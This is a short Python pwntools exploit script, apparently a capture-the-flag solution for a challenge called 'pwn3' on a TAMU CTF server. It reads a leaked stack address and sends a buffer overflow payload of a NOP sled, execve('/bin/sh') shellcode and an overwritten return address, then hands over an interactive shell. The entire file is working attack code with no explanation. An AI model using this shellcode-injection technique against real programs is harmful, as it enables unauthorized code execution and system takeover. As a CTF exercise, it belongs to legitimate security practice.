from pwn import *

IS_LOCAL = False

bin = ELF('./pwn3')

if IS_LOCAL:
  p = process('./pwn3')
else:
  p = remote('pwn.tamuctf.com', 4323)

# gdb.attach(p, '')

var_addr = int(p.recvuntil('\n').split()[9][:-1], 16)
  
log.info('Var Addr: ' + hex(var_addr))

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = '\x90' * (0x12E - 0x60 - len(shellcode)) + shellcode
payload += '\x90' * 0x60

payload += p32(var_addr)

p.sendline(payload)

p.interactive()
